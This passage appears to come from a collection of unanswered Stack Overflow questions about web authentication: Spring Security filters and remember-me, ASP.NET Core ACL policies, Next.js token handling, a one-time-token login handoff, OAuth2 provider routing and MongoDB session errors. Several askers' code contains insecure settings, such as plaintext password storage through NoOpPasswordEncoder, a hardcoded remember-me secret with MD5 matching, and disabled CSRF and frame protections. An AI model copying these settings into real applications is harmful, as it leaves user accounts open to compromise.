    http.cors(corsConfig-&gt;corsConfig.configurationSource(getConfigurationSource()));
    http
            .authorizeHttpRequests(request -&gt; {
                request.requestMatchers(
                        new AntPathRequestMatcher(&quot;/log&quot;)
                ).permitAll()
                .requestMatchers(
                    new AntPathRequestMatcher(&quot;/h2-console/&quot;)
                ).permitAll()
                        .requestMatchers(
                                new AntPathRequestMatcher(&quot;/&quot;)
                        ).authenticated();
            })
            .addFilterBefore(jwtAuthorizationFilter, UsernamePasswordAuthenticationFilter.class);

            http.csrf((csrf) -&gt;
                    csrf.ignoringRequestMatchers(
                            new AntPathRequestMatcher(&quot;/h2-console/**&quot;)
                    ).csrfTokenRepository(
                            CookieCsrfTokenRepository.withHttpOnlyFalse()
                    )
            );
            http.csrf((csrf) -&gt;
                    csrf.ignoringRequestMatchers(
                            new AntPathRequestMatcher(&quot;/log&quot;)
                    ).csrfTokenRepository(
                            CookieCsrfTokenRepository.withHttpOnlyFalse()
                    )
            );
            http.headers((headers) -&gt; headers
                    .frameOptions(
                            HeadersConfigurer.FrameOptionsConfig::disable
                    )
            );
    return http.build();
}
</code></pre>
<p>I would appreciate any help to resolve this, as I've been trying multiple ways already and couldn't find a solution.</p>
<hr />
<p><strong>Latest Update</strong></p>
<p>I added the role <strong>&quot;USER&quot;</strong>. When there's a user role incorporated in the token, then I am able to call the other endpoints that require authentication. At this time the below code is used to check the role.</p>
<pre><code>.requestMatchers(new AntPathRequestMatcher(&quot;/**&quot;)).hasAuthority(&quot;USER&quot;);
</code></pre>
<p>Is it necessary to always incorporate the role along with the token in spring security. Isn't it possible to use the token without incorporating the role within it?</p>
<p>Also if there's any other better solution please share!</p>
"
"<p>I'm developing an ASP.NET Core 8.0 application and I need to implement Access Control Lists (ACLs) to manage user access rights. Currently, I'm using policies to check if the user's roles have permission for the resource being accessed. However, I'm wondering if my approach is correct or if there's a better way to do it.</p>
<p>Here's what I'm currently doing:</p>
<ol>
<li><p>Add Permission</p>
<pre><code>{
    &quot;id&quot;: 1,
    &quot;resource&quot;: &quot;api/Resources/Endpoints&quot;, // or &quot;api/Resources/Endpoints/:id&quot;...
    &quot;method&quot;: &quot;get&quot; // or &quot;post&quot;,...
}
</code></pre>
</li>
<li><p>Add permissions to role</p>
</li>
<li><p>Add roles to user</p>
</li>
<li><p>Get role from JWT claims to check permission resource</p>
</li>
</ol>
<p>I have this in <code>Program.cs</code>:</p>
<pre><code>builder.Services.AddAuthorization(options =&gt;
{
    options.AddPolicy(&quot;ACLs&quot;, policy =&gt;
        policy.RequireAssertion(async context =&gt;
        {
            var canAccess = false;
            var httpContext = context.Resource as HttpContext;

            // get method
            var method = httpContext.Request.Method.ToString();
            // get endpoint /api/controller/...
            var endpoint = httpContext.GetEndpoint();
            var routePattern = (endpoint as RouteEndpoint)?.RoutePattern;
            var endpointValue = &quot;&quot;;

            // convert endpoint from /api/{id}/... to /api/:id to match resource in permission
            if (routePattern != null)
            {
                endpointValue = routePattern.RawText;
            }

            if (httpContext.User.Identity.IsAuthenticated)
            {
                // get dbContext from httpContext
                var dbContext = httpContext.RequestServices.GetRequiredService&lt;Context&gt;();
                // get roleClaims and check role can access endpoint
                var roleClaims = httpContext.User.Claims.Where(claim =&gt; claim.Type == ClaimTypes.Role);

                foreach (var claim in roleClaims)
                {
                    if (canAccess)
                        break;

                    var roleName = claim.Value;
                    var roleEntity = dbContext.roles.Include(role =&gt; role.Permissions).FirstOrDefault(role =&gt; role.Name == roleName);

                    foreach (var permission in roleEntity.Permissions)
                    {
                        if (permission.Resource == StringConverter.ConvertToColonFormat(endpointValue) &amp;&amp; MethodConverter.ConvertToString(permission.Method).ToLower() == method.ToLower())
                        {
                            canAccess = true;
                            break;
                        }
                    }
                }
            }
            return canAccess;
        }));
});
</code></pre>
<p>In the controller:</p>
<p><a href=""https://i.stack.imgur.com/bEqA0.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/bEqA0.png"" alt=""enter image description here"" /></a></p>
<p>I'm unsure if this approach is the most efficient or if there are better practices for implementing ACLs in ASP.NET Core 8.0. I would appreciate any guidance, insights, or alternative approaches that the community can offer.</p>
<p>Thank you.</p>
"
"<p>I have the following situation. Using Next 14, I have a component that I want to render on the server side, fetching data from an API in NestJS. The problem arises when sending data with axios; I need to set the Authorization Header as Bearer and add the AccessToken from the client side. Considering that there is no localStorage or sessionStorage in server-side components, I'm not sure how to resolve this issue.
`
import React from 'react'
import axios from 'axios'</p>
<p>import TableContracts from '@/components/tablecontracts.components'</p>
<p>export default async function Page() {</p>
<pre><code>const results = await axios.get('http://localhost:3001/empresas/listado-empresas', {
            headers: {
                'Authorization': `Bearer ${'Aqui deberia ir el accessToken'}`
            }
        });

const columns = [
    {name: 'ID', uid: 'id'},
    {name: &quot;Nombre&quot;, uid: 'nombre'},
    {name: &quot;Alias&quot;, uid: 'alias'},
    {name: &quot;Telefono&quot;, uid: 'telefono'},
    {name: &quot;Representante&quot;, uid: 'representante'},
    {name: &quot;Direccion&quot;, uid: 'direccion'},
    {name: &quot;Cuenta&quot;, uid: 'cuenta'},
    {name: &quot;Acciones&quot;, uid: 'actions'},
  ];
</code></pre>
<p>return (

&lt;TableContracts columns={columns} users={results} isAdmin={false} key={'tablecontractuid'} /&gt;

)
}</p>
<p>`</p>
<p>To know the correct way to handle the access token in components that are rendered on the server side. The fastest solution is to have it as a component rendered on the client side, but I want to use the features of Next 14.</p>
"
"<p>I have a mobile app built with react native, a nestjs API for the mobile app, and I'm working on a web app (nextjs).</p>
<p>The mobile app and API already have JWT based authentication built.  I am building the web app from scratch.</p>
<p>At an extremely high level, what I want to do is:</p>
<p>-In my mobile app, the user is already logged in</p>
<p>-The user presses on a button to launch the web app in the browser</p>
<p>-The browser opens the web app, and the user is already logged in.  I do not want the user to have to enter credentials at any point.</p>
<p>I'm trying to think of the best strategy for auth in this case. Here is what I've come up with:</p>
<p>1 - App user, already logged in, presses a button to open the web app</p>
<p>2 - App requests a one-time use token from API</p>
<p>3 - On receiving request, API:</p>
<p>3a - Creates a one-time token (OTT).  This token is a JWT with an identifier (uuid) in the payload and short expiry time (5m?)</p>
<p>3b - Stores a record in redis, with the identifier as key, an expiry equal to that of the JWT, and a value of the user’s App id</p>
<p>4 - The OTT is sent back to App in the response</p>
<p>5 - App constructs a link to the Store, passing in the OTT in the URL params</p>
<p>6 - The web app is opened in the browser and extracts the OTT from the URL</p>
<p>7 - The web app sends the OTT to API and requests a new token</p>
<p>8 - API verifies the OTT, extracts the identifier, and queries redis for the associated user.</p>
<p>9 - If a record is found, the API extracts the user’s App id from the redis store, immediately deletes the record from redis (ensuring the token can be used only once), and finally uses the extracted id to query the db for the user’s data</p>
<p>10 - API Creates a new JWT with the necessary user data</p>
<p>11 - API sends new JWT back to the web app inside an httponly cookie</p>
<p>12 - The web app receives the cookie and can make requests to the API</p>
<p>This is my first time implementing something like this from scratch, so I am mostly wondering if this is secure.  Passing the one time JWT from the mobile app to the web app in query params <em>feels</em> a bit sketchy to me, but because it has a short expiry and would be immediately invalidated, is it relatively secure?  Are there considerations I might not be making?</p>
<p>I have not tried to implement this yet, am mostly looking to see if it is a valid approach.  I am open to other solutions, but since I am working with an already built token-based auth flow between the mobile app and API, I'm not looking to implement solutions like OAuth at this time.</p>
<p>As always thank you!!</p>
"
"<p>I need the user of my app to be able to share the URL of a page with another team member. The URL would look something like this: <code>https://my.app/home/team/as895bnkjer/documents/doc/abwnoi34jkl</code></p>
<p>The app should check that the user opening the link is a member of the team. It also needs to load the team data into my <code>BTeamRepository</code>. But I need to do that <em>before</em> the <code>doc</code> page.</p>
<p>This is <em>not</em> a question authentication. We'll assume the user is already signed in.</p>
<p>My thinking is to use a shell route with a builder that only displays the child route once the team data has been loaded:</p>
<pre class=""lang-dart prettyprint-override""><code>@TypedShellRoute&lt;BTeamPageRoute&gt;(
  routes: [
    TypedGoRoute&lt;BDocumentsPageRoute&gt;(
      path: '/teams/:teamID/documents',
      name: 'documents',
      routes: [
        TypedGoRoute&lt;BDocumentPageRoute&gt;(
          path: 'doc/:documentID',
          name: 'document',
        ),
      ],
    ),
  ],
)
class BTeamPageRoute extends ShellRouteData {
  BTeamPageRoute({required this.teamID});

  final String teamID;

  @override
  Widget builder(BuildContext context, GoRouterState state, Widget navigator) {
    return BTeamPage(
      teamID: teamID,
      child: navigator,
    );
  }
}

class BTeamPage extends StatelessWidget {
  const BTeamPage({
    required this.child,
    required this.teamID,
    super.key,
  });

  final String teamID;

  final Widget child;

  @override
  Widget build(BuildContext context) {
    return BlocProvider(
      create: (context) =&gt; BTeamLoadBloc(
        teamID: teamID,
        teamsRepository: context.read&lt;BTeamsRepository&gt;(),
      ),
      child: BlocBuilder&lt;BTeamLoadBloc, BTeamLoadState&gt;(
        builder: (context, state) =&gt; switch (state) {
          BTeamLoadInProgress() =&gt; const BTeamLoadingView(),
          BTeamLoadFailure() =&gt; const BTeamFailureView(),
          BTeamLoadSuccess() =&gt; child,
        },
      ),
    );
  }
}
</code></pre>
<p>But how do I pass the team ID to the <code>BTeamPageRoute</code>?</p>
"
"<p><a href=""https://i.stack.imgur.com/vlpd3.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/vlpd3.png"" alt=""enter image description here"" /></a></p>
<p>I'm developing an Express application and aiming to implement the highest level of security possible. In this system, I want to ensure that even if a hacker somehow obtains a bearer token, they are unable to access backend APIs on behalf of the user. To achieve this, I plan to incorporate checks for the bearer token, IP address, device ID, user's geographic location, and any other unique identifiers tied to the user.</p>
<p>Furthermore, I want to implement a feature where users are immediately notified if someone logs into the website from a different device ID, IP address, or geographic location.</p>
<p>Could anyone provide guidance on creating middleware in Express to accomplish these security measures? Additionally, are there any existing libraries or frameworks that facilitate these functionalities?</p>
<p>I attempted to pass the device ID, user's location, and IP address in the API headers. However, I could not figure out how to do it.</p>
<p>While exploring potential solutions, I came across an open-source authentication system called Keycloak (<a href=""https://www.keycloak.org/"" rel=""nofollow noreferrer"">https://www.keycloak.org/</a>) that seems to offer the features you're looking for. Keycloak provides mechanisms to incorporate various security checks, including device ID, user location, and IP address verification.</p>
<p>Although Keycloak presents a comprehensive solution, I want to code and build the authentication system independently.</p>
"
"<p>User registration logic:</p>
<pre><code>    @PostMapping(consumes = MediaType.APPLICATION_FORM_URLENCODED_VALUE)
    public String registerUser(@RequestBody MultiValueMap&lt;String, String&gt; formData, HttpServletRequest request, HttpServletResponse response, Model model) {
        logger.info(&quot;REGISTER USER&quot;);
        String username = formData.getFirst(&quot;username&quot;);
        String password = formData.getFirst(&quot;password&quot;);
        String passwordConfirm = formData.getFirst(&quot;password-confirm&quot;);
        if (userRepository.findByUsername(username) != null) {
            logger.info(&quot;UNSUCCESSFUL: username already taken&quot;);
            model.addAttribute(&quot;usernameAlreadyTaken&quot;, true);
            return &quot;register&quot;;
        }
        if (!password.equals(passwordConfirm)) {
            logger.info(&quot;UNSUCCESSFUL: passwords don't match&quot;);
            model.addAttribute(&quot;passwordMismatch&quot;, true);
            return &quot;register&quot;;
        }
        // save user to database
        User newUser = new User(0L, username, password);
        userRepository.save(newUser);
        roleRepository.save(new Role(0L, newUser, &quot;USER&quot;));
        // remember user
        Authentication formAuth = new UsernamePasswordAuthenticationToken(username, password);
        Authentication authentication = authenticationManager.authenticate(formAuth);
        SecurityContext securityContext = SecurityContextHolder.createEmptyContext();
        securityContext.setAuthentication(authentication);
        SecurityContextHolder.setContext(securityContext);
        rememberMeServices.loginSuccess(request, response, authentication);
        // invalidate session - prevent session fixation attacks
        request.getSession().invalidate();
        securityContextRepository.saveContext(securityContext, request, response);
        logger.info(&quot;SUCCESSFUL: new user created&quot;);
        return &quot;register&quot;;
    }
</code></pre>
<p>I want that after a user registers, a Remember Me token is created for him to remember the user.</p>
<p>I use this method:</p>
<pre><code>rememberMeServices.loginSuccess(request, response, authentication);
</code></pre>
<p>The user registration is successful, but after restarting the application I have to log into the site again, although this should not be the case, since in theory I have already created the corresponding Remember Me token for this user to automatically log into the site. What went wrong and how to fix it?</p>
<p>My security configuration:</p>
<pre><code>@Configuration
@EnableWebSecurity
@EnableMethodSecurity
public class WebSecurityConfig {

    @Bean
    public SecurityFilterChain filter(HttpSecurity http, SecurityContextRepository securityContextRepository, CustomAccessDeniedHandler accessDeniedHandler,
                                      CustomAuthenticationFailureHandler authenticationFailureHandler, RememberMeServices rememberMeServices) throws Exception {
        return http
                .addFilterAfter(new CsrfTokenLogger(), CsrfFilter.class)
                .authorizeHttpRequests((requests) -&gt; requests
                        .requestMatchers(&quot;/user&quot;).hasAnyAuthority(&quot;USER&quot;, &quot;ADMIN&quot;)
                        .requestMatchers(&quot;/admin&quot;).hasAnyAuthority(&quot;ADMIN&quot;)
                        .anyRequest().permitAll()
                )
                .formLogin((form) -&gt; form.loginPage(&quot;/login&quot;).failureHandler(authenticationFailureHandler).securityContextRepository(securityContextRepository))
                .logout((logout) -&gt; logout.logoutUrl(&quot;/logout&quot;).logoutSuccessUrl(&quot;/&quot;).invalidateHttpSession(true).deleteCookies(&quot;JSESSIONID&quot;))
                .rememberMe((remember) -&gt; remember.rememberMeServices(rememberMeServices))
                .securityContext(securityContext -&gt; securityContext.securityContextRepository(securityContextRepository))
                .exceptionHandling((exception) -&gt; exception.authenticationEntryPoint(new LoginUrlAuthenticationEntryPoint(&quot;/login&quot;)).accessDeniedHandler(accessDeniedHandler))
                .build();
    }

    @Bean
    public RememberMeServices rememberMeServices(UserDetailsService userDetailsService) {
        TokenBasedRememberMeServices.RememberMeTokenAlgorithm encodingAlgorithm = TokenBasedRememberMeServices.RememberMeTokenAlgorithm.SHA256;
        TokenBasedRememberMeServices rememberMe = new TokenBasedRememberMeServices(&quot;secretKeyForRememberMeToken&quot;, userDetailsService, encodingAlgorithm);
        rememberMe.setMatchingAlgorithm(TokenBasedRememberMeServices.RememberMeTokenAlgorithm.MD5);
        return rememberMe;
    }

    @Bean
    public SecurityContextRepository securityContextRepository() {
        return new DelegatingSecurityContextRepository(
                new RequestAttributeSecurityContextRepository(),
                new HttpSessionSecurityContextRepository()
        );
    }

    @Bean
    public AuthenticationManager authenticationManager(UserDetailsService userDetailsService, PasswordEncoder passwordEncoder) {
        DaoAuthenticationProvider authenticationProvider = new DaoAuthenticationProvider();
        authenticationProvider.setUserDetailsService(userDetailsService);
        authenticationProvider.setPasswordEncoder(passwordEncoder);
        return new ProviderManager(authenticationProvider);
    }

    @Bean
    public PasswordEncoder passwordEncoder() {
        return NoOpPasswordEncoder.getInstance();
    }
}
</code></pre>
<p>I didn’t find a tutorial on the Internet on how to remember a user after registration using the Remember Me token</p>
"
"<p>I have a reactive Spring Boot 2 application, which acts as a web agent that initiates user authentication using Spring Security. The end users, who reach this application, come from either public or private domains and the web agent should accordingly redirect them to either identity-provider.com (public) or identity-provider.biz (private) for login.
The redirect_uri post authentication remains the same in both cases.</p>
<p>We have configured 2 Oauth2 identity providers and 2 corresponding Oauth2 clients inside the application.yaml.</p>
<pre><code>spring:
  security:
    oauth2:
      client:
        provider:
          idpcom:
            issuer-uri: https://identity-provider.com
          idpbiz:
            issuer-uri: https://identity-provider.biz
        
        registration:
          idpcom:
            provider: idpcom
            client-id: clientid
            client-secret: clientsecret
            authorization-grant-type: authorization_code
            redirect-uri: https://my-domain.com/login/oauth2/code/idpcom
            scope:
              - openid

          idpbiz:
            provider: idpbiz
            client-id: clientid
            client-secret: clientsecret
            authorization-grant-type: authorization_code
            redirect-uri: https://my-domain.com/login/oauth2/code/idpbiz
            scope:
              - openid
</code></pre>
<p>With this configuration, when application receives a request, the end user is presented with links to both identity providers. The user is forced to choose one of them and start the authentication flow.
<a href=""https://i.stack.imgur.com/O8gQM.png"" rel=""nofollow noreferrer"">what end user sees</a></p>
<p>We found that following code in Spring security is building the HTML page shown above</p>
<pre><code>ServerHttpSecurity.setDefaultEntryPoints(ServerHttpSecurity http)
</code></pre>
<p>Our requirement is to programmatically resolve the identity provider at runtime and directly show the corresponding login page to the end user. The decision to use identity-provider.com or identity-provider.biz is based on end users IP address (captured in X-Forwarded-For header).</p>
<p>We need suggestions to implement this functionality.</p>
"
"<p>Does anyone know how I could pass to the Chrome function of the python undetected_chromedriver (v3.5.5)  module a parameter in the header with a token to use in a get request.
Thanks in advance</p>
<p>I tried this but it failed me:</p>
<pre class=""lang-py prettyprint-override""><code>def init_webdriver(headless=False, token=None):
    options = uc.ChromeOptions()
    user_agent = &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0&quot;
    options.add_argument(f&quot;user-agent={user_agent}&quot;)
    options.add_argument(f&quot;authorization={token}&quot;)
   
    driver = uc.Chrome(headless=headless,options=options)
    return driver
</code></pre>
"
"<p>Please tell me what to do. When I log in, a session is created in mongodb. When requesting another protected endpoint, everything works the first time, the second time I get an error deserializing the UserDetails class and unauthorized, that is, the session is somehow invalidated. In this case, another session is created in the database. SessionCreationPolicy set to IF_REQUIRED
Also, if I request the endpoint for the third time, I just get unauthorized without an error.</p>
<p>AuthSessionFilter.class</p>
<pre><code>public class AuthSessionFilter extends OncePerRequestFilter {

    @Autowired
    private UserDetailsServiceImpl userDetailsService;

    @Autowired
    UserRepository userRepository;

    @Override
    protected void doFilterInternal(@NotNull HttpServletRequest request, @NotNull HttpServletResponse response, @NotNull FilterChain filterChain) throws ServletException, IOException {
        try {
            HttpSession session = request.getSession(false);
            if (session != null) {
                String userId = (String) session.getAttribute(&quot;userId&quot;);
                System.out.println(userId);
                if (extractSessionId(request) != null &amp;&amp; SecurityContextHolder.getContext().getAuthentication() == null &amp;&amp; userId != null) {
                    UserDetails userDetails = userDetailsService.loadById(userId);

                    if (userDetails != null) {
                        UsernamePasswordAuthenticationToken authentication = new UsernamePasswordAuthenticationToken(userDetails, null, userDetails.getAuthorities());
                        authentication.setDetails(new WebAuthenticationDetailsSource().buildDetails(request));

                        SecurityContextHolder.getContext().setAuthentication(authentication);
                    }
                }
            }
        } catch (Exception exception) {
            System.err.println(exception.getMessage());
        }

        filterChain.doFilter(request, response);
    }

    private String extractSessionId(HttpServletRequest request) {
        return Arrays.stream(request.getCookies())
                .filter(cookie -&gt; &quot;SESSION&quot;.equals(cookie.getName()))
                .findFirst()
                .map(Cookie::getValue)
                .orElse(null);
    }
}
</code></pre>
<p>Authentication method:</p>
<pre><code>    public ResponseEntity&lt;?&gt; authenticateUser(LoginRequest loginRequest, HttpServletRequest request) {
        User user = userRepository.findByEmail(loginRequest.getEmail()).orElseThrow(() -&gt; new UserNotFoundException(&quot;User not found&quot;));
        UserDetails userDetails = userDetailsService.loadById(user.getId());
        if (userDetails != null) {
            UsernamePasswordAuthenticationToken authentication = new UsernamePasswordAuthenticationToken(userDetails, null, userDetails.getAuthorities());
            authentication.setDetails(new WebAuthenticationDetailsSource().buildDetails(request));

            SecurityContextHolder.getContext().setAuthentication(authentication);
        }

        HttpSession session = request.getSession(false);
        if (session == null) {
            session = request.getSession(true);
        }

        if (session.getAttribute(&quot;userId&quot;) == null) {
            session.setAttribute(&quot;userId&quot;, user.getId());
        }

        return ResponseEntity.ok().body(request.getSession().getId());
    }
</code></pre>
<p>UserDetails:</p>
<pre><code>public class UserDetailsImpl implements UserDetails {
    @Serial
    private static final long serialVersionUID = 1L;
    private final String id;
    private final String username;
    private final String email;
    @JsonIgnore
    private String password;
    private final Collection&lt;? extends GrantedAuthority&gt; authorities;

    public UserDetailsImpl(String id,
                           String username,
                           String email,
                           String password,
                           Collection&lt;? extends GrantedAuthority&gt; authorities) {
        this.id = id;
        this.username = username;
        this.email = email;
        this.password = password;
        this.authorities = authorities;

    }

    public static UserDetailsImpl build(User user) {
        List&lt;GrantedAuthority&gt; authorities = user.getRoles().stream()
                .map(role -&gt; new SimpleGrantedAuthority(role.getName().name()))
                .collect(Collectors.toList());

        return new UserDetailsImpl(
                user.getId(),
                user.getUsername(),
                user.getEmail(),
                user.getPassword(),
                authorities);
    }

    @Override
    public Collection&lt;? extends GrantedAuthority&gt; getAuthorities() {
        return authorities;
    }

    public String getId() {
        return id;
    }
    public String getEmail() {
        return email;
    }
    @Override
    public String getPassword() {
        return password;
    }
    @Override
    public String getUsername() {
        return username;
    }
    
    @Override
    public boolean equals(Object o) {
        if (this == o)
            return true;
        if (o == null || getClass() != o.getClass())
            return false;
        UserDetailsImpl user = (UserDetailsImpl) o;
        return Objects.equals(id, user.id);
    }
}
</code></pre>
<p>logs:</p>
<pre><code>2024-02-22T12:08:31.980+03:00 ERROR 35398 --- [nio-8080-exec-6] o.s.s.d.m.JacksonMongoSessionConverter   : Error during Mongo Session deserialization

com.fasterxml.jackson.databind.exc.InvalidDefinitionException: Cannot construct instance of `com.deaslide.exchange.security.services.UserDetailsImpl` (no Creators, like default constructor, exist): cannot deserialize from Object value (no delegate- or property-based Creator)
 at [Source: UNKNOWN; byte offset: #UNKNOWN] (through reference chain: org.springframework.session.data.mongo.MongoSession[&quot;attrs&quot;]-&gt;java.util.HashMap[&quot;SPRING_SECURITY_CONTEXT&quot;]-&gt;org.springframework.security.core.context.SecurityContextImpl[&quot;authentication&quot;])
    at com.fasterxml.jackson.databind.exc.InvalidDefinitionException.from(InvalidDefinitionException.java:67) ~[jackson-databind-2.15.3.jar:2.15.3]
    at com.fasterxml.jackson.databind.DeserializationContext.reportBadDefinition(DeserializationContext.java:1915) ~[jackson-databind-2.15.3.jar:2.15.3]
    at com.fasterxml.jackson.databind.DatabindContext.reportBadDefinition(DatabindContext.java:414) ~[jackson-databind-2.15.3.jar:2.15.3]
    at com.fasterxml.jackson.databind.DeserializationContext.handleMissingInstantiator(DeserializationContext.java:1360) ~[jackson-databind-2.15.3.jar:2.15.3]
    at com.fasterxml.jackson.databind.deser.BeanDeserializerBase.deserializeFromObjectUsingNonDefault(BeanDeserializerBase.java:1424) ~[jackson-databind-2.15.3.jar:2.15.3]
    at com.fasterxml.jackson.databind.deser.BeanDeserializer.deserializeFromObject(BeanDeserializer.java:352) ~[jackson-databind-2.15.3.jar:2.15.3]
    at com.fasterxml.jackson.databind.deser.BeanDeserializer._deserializeOther(BeanDeserializer.java:220) ~[jackson-databind-2.15.3.jar:2.15.3]
    at com.fasterxml.jackson.databind.deser.BeanDeserializer.deserialize(BeanDeserializer.java:187) ~[jackson-databind-2.15.3.jar:2.15.3]
    at com.fasterxml.jackson.databind.jsontype.impl.AsPropertyTypeDeserializer._deserializeTypedForId(AsPropertyTypeDeserializer.java:170) ~[jackson-databind-2.15.3.jar:2.15.3]
    at com.fasterxml.jackson.databind.jsontype.impl.AsPropertyTypeDeserializer.deserializeTypedFromObject(AsPropertyTypeDeserializer.java:136) ~[jackson-databind-2.15.3.jar:2.15.3]
    at com.fasterxml.jackson.databind.jsontype.impl.AsPropertyTypeDeserializer.deserializeTypedFromAny(AsPropertyTypeDeserializer.java:240) ~[jackson-databind-2.15.3.jar:2.15.3]
    at com.fasterxml.jackson.databind.deser.std.UntypedObjectDeserializerNR.deserializeWithType(UntypedObjectDeserializerNR.java:115) ~[jackson-databind-2.15.3.jar:2.15.3]
    at com.fasterxml.jackson.databind.deser.impl.TypeWrappedDeserializer.deserialize(TypeWrappedDeserializer.java:74) ~[jackson-databind-2.15.3.jar:2.15.3]
    at com.fasterxml.jackson.databind.deser.DefaultDeserializationContext.readRootValue(DefaultDeserializationContext.java:323) ~[jackson-databind-2.15.3.jar:2.15.3]
    at com.fasterxml.jackson.databind.ObjectMapper._readValue(ObjectMapper.java:4801) ~[jackson-databind-2.15.3.jar:2.15.3]
    at com.fasterxml.jackson.databind.ObjectMapper.readValue(ObjectMapper.java:2974) ~[jackson-databind-2.15.3.jar:2.15.3]
    at org.springframework.security.jackson2.UsernamePasswordAuthenticationTokenDeserializer.getPrincipal(UsernamePasswordAuthenticationTokenDeserializer.java:104) ~[spring-security-core-6.1.5.jar:6.1.5]
    at org.springframework.security.jackson2.UsernamePasswordAuthenticationTokenDeserializer.deserialize(UsernamePasswordAuthenticationTokenDeserializer.java:75) ~[spring-security-core-6.1.5.jar:6.1.5]
    at org.springframework.security.jackson2.UsernamePasswordAuthenticationTokenDeserializer.deserialize(UsernamePasswordAuthenticationTokenDeserializer.java:51) ~[spring-security-core-6.1.5.jar:6.1.5]
    at com.fasterxml.jackson.databind.jsontype.impl.AsPropertyTypeDeserializer._deserializeTypedForId(AsPropertyTypeDeserializer.java:170) ~[jackson-databind-2.15.3.jar:2.15.3]
    at com.fasterxml.jackson.databind.jsontype.impl.AsPropertyTypeDeserializer.deserializeTypedFromObject(AsPropertyTypeDeserializer.java:136) ~[jackson-databind-2.15.3.jar:2.15.3]
    at com.fasterxml.jackson.databind.deser.AbstractDeserializer.deserializeWithType(AbstractDeserializer.java:263) ~[jackson-databind-2.15.3.jar:2.15.3]
    at com.fasterxml.jackson.databind.deser.impl.FieldProperty.deserializeAndSet(FieldProperty.java:147) ~[jackson-databind-2.15.3.jar:2.15.3]
    at com.fasterxml.jackson.databind.deser.BeanDeserializer.vanillaDeserialize(BeanDeserializer.java:314) ~[jackson-databind-2.15.3.jar:2.15.3]
    at com.fasterxml.jackson.databind.deser.BeanDeserializer._deserializeOther(BeanDeserializer.java:215) ~[jackson-databind-2.15.3.jar:2.15.3]
    at com.fasterxml.jackson.databind.deser.BeanDeserializer.deserialize(BeanDeserializer.java:187) ~[jackson-databind-2.15.3.jar:2.15.3]
    at com.fasterxml.jackson.databind.jsontype.impl.AsPropertyTypeDeserializer._deserializeTypedForId(AsPropertyTypeDeserializer.java:170) ~[jackson-databind-2.15.3.jar:2.15.3]
    at com.fasterxml.jackson.databind.jsontype.impl.AsPropertyTypeDeserializer.deserializeTypedFromObject(AsPropertyTypeDeserializer.java:136) ~[jackson-databind-2.15.3.jar:2.15.3]
    at com.fasterxml.jackson.databind.jsontype.impl.AsPropertyTypeDeserializer.deserializeTypedFromAny(AsPropertyTypeDeserializer.java:240) ~[jackson-databind-2.15.3.jar:2.15.3]
    at com.fasterxml.jackson.databind.deser.std.UntypedObjectDeserializerNR.deserializeWithType(UntypedObjectDeserializerNR.java:115) ~[jackson-databind-2.15.3.jar:2.15.3]
    at com.fasterxml.jackson.databind.deser.std.MapDeserializer._readAndBindStringKeyMap(MapDeserializer.java:625) ~[jackson-databind-2.15.3.jar:2.15.3]
    at com.fasterxml.jackson.databind.deser.std.MapDeserializer.deserialize(MapDeserializer.java:449) ~[jackson-databind-2.15.3.jar:2.15.3]
    at com.fasterxml.jackson.databind.deser.std.MapDeserializer.deserialize(MapDeserializer.java:32) ~[jackson-databind-2.15.3.jar:2.15.3]
    at com.fasterxml.jackson.databind.jsontype.impl.AsPropertyTypeDeserializer._deserializeTypedForId(AsPropertyTypeDeserializer.java:170) ~[jackson-databind-2.15.3.jar:2.15.3]
    at com.fasterxml.jackson.databind.jsontype.impl.AsPropertyTypeDeserializer.deserializeTypedFromObject(AsPropertyTypeDeserializer.java:136) ~[jackson-databind-2.15.3.jar:2.15.3]
    at com.fasterxml.jackson.databind.deser.std.MapDeserializer.deserializeWithType(MapDeserializer.java:492) ~[jackson-databind-2.15.3.jar:2.15.3]
    at com.fasterxml.jackson.databind.deser.impl.FieldProperty.deserializeAndSet(FieldProperty.java:147) ~[jackson-databind-2.15.3.jar:2.15.3]
    at com.fasterxml.jackson.databind.deser.BeanDeserializer.deserialize(BeanDeserializer.java:278) ~[jackson-databind-2.15.3.jar:2.15.3]
    at com.fasterxml.jackson.databind.deser.BeanDeserializer._deserializeUsingPropertyBased(BeanDeserializer.java:463) ~[jackson-databind-2.15.3.jar:2.15.3]
    at com.fasterxml.jackson.databind.deser.BeanDeserializerBase.deserializeFromObjectUsingNonDefault(BeanDeserializerBase.java:1409) ~[jackson-databind-2.15.3.jar:2.15.3]
    at com.fasterxml.jackson.databind.deser.BeanDeserializer.deserializeFromObject(BeanDeserializer.java:352) ~[jackson-databind-2.15.3.jar:2.15.3]
    at com.fasterxml.jackson.databind.deser.BeanDeserializer._deserializeOther(BeanDeserializer.java:220) ~[jackson-databind-2.15.3.jar:2.15.3]
    at com.fasterxml.jackson.databind.deser.BeanDeserializer.deserialize(BeanDeserializer.java:187) ~[jackson-databind-2.15.3.jar:2.15.3]
    at com.fasterxml.jackson.databind.jsontype.impl.AsPropertyTypeDeserializer._deserializeTypedForId(AsPropertyTypeDeserializer.java:170) ~[jackson-databind-2.15.3.jar:2.15.3]
    at com.fasterxml.jackson.databind.jsontype.impl.AsPropertyTypeDeserializer.deserializeTypedFromObject(AsPropertyTypeDeserializer.java:136) ~[jackson-databind-2.15.3.jar:2.15.3]
    at com.fasterxml.jackson.databind.deser.BeanDeserializerBase.deserializeWithType(BeanDeserializerBase.java:1296) ~[jackson-databind-2.15.3.jar:2.15.3]
    at com.fasterxml.jackson.databind.deser.impl.TypeWrappedDeserializer.deserialize(TypeWrappedDeserializer.java:74) ~[jackson-databind-2.15.3.jar:2.15.3]
    at com.fasterxml.jackson.databind.deser.DefaultDeserializationContext.readRootValue(DefaultDeserializationContext.java:323) ~[jackson-databind-2.15.3.jar:2.15.3]
    at com.fasterxml.jackson.databind.ObjectMapper._readMapAndClose(ObjectMapper.java:4825) ~[jackson-databind-2.15.3.jar:2.15.3]
    at com.fasterxml.jackson.databind.ObjectMapper.readValue(ObjectMapper.java:3772) ~[jackson-databind-2.15.3.jar:2.15.3]
    at com.fasterxml.jackson.databind.ObjectMapper.readValue(ObjectMapper.java:3740) ~[jackson-databind-2.15.3.jar:2.15.3]
    at org.springframework.session.data.mongo.JacksonMongoSessionConverter.convert(JacksonMongoSessionConverter.java:140) ~[spring-session-data-mongodb-3.1.3.jar:3.1.3]
